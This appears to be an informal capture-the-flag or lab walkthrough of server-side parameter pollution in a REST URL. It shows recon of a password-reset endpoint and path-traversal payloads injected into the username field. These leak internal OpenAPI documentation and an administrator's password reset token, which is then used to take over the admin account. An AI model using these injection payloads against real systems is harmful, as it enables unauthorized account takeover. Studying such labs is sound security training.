## Exploiting server-side parameter pollution in a REST URL

Steps:
1-Api recon 
  .can't found api endpoint
   /api ==> not found

2-check login page and also not found any userful data

3-check reset password and get some notes
  .if username is valid return: 
        HTTP/2 200 OK
        Content-Type: application/json; charset=utf-8
        X-Frame-Options: SAMEORIGIN
        Content-Length: 49

        {"type":"email","result":"*****@normal-user.net"}
    else:
        HTTP/2 400 Bad Request
        Content-Type: application/json; charset=utf-8
        X-Frame-Options: SAMEORIGIN
        Content-Length: 92

        {
        "type": "error",
        "result": "The provided username \"administratorb\" does not exist"
        }

4-we can yes this to try to enter into admin account for example

in resert password find js script and anaylsis it and found /forgot-password?passwordResetToken=${resetToken}`;

so i know we need token to can change password 

5-if username=administrator%23
we get Inalid route 

 elif username=../../../../administrator => tell not found 

  else:
    we can found api documentation by check deafult 
    1-/api
    2-/openapi.json
    3-swagger/index.html

username=../../../../openapi.json => we get api documantation


################################################################
 "error": "Unexpected response from API server:\n{\n  \"openapi\": \"3.0.0\",\n  \"info\": {\n    \"title\": \"User API\",\n    \"version\": \"2.0.0\"\n  },\n  \"paths\": {\n    \"/api/internal/v1/users/{username}/field/{field}\": {\n      \"get\": {\n        \"tags\": [\n          \"users\"\n        ],\n        \"summary\": \"Find user by username\",\n        \"description\": \"API Version 1\",\n        \"parameters\": [\n          {\n            \"name\": \"username\",\n            \"in\": \"path\",\n            \"description\": \"Username\",\n            \"required\": true,\n            \"schema\": {\n        ..."
}

##################################################################

yes we get the route 

if(username=administrator/field/passwordResetToken%23):
  resullt==>
   {
  "type": "error",
  "result": "This version of API only supports the email field for security reasons"
}

we get path from documenation 
/api/internal/v1/users/{username}/field
try:
username=../../v1/users/administrator/field/passwordResetToken%23


yes it's sucess
{
  "type": "passwordResetToken",
  "result": "rw23ynhiggnj71cbvt7iyg6a1b60youn"
}


get into browser and then 
request forget-password?passwordResetToken=.......

change administrator and login in  => it's sucess
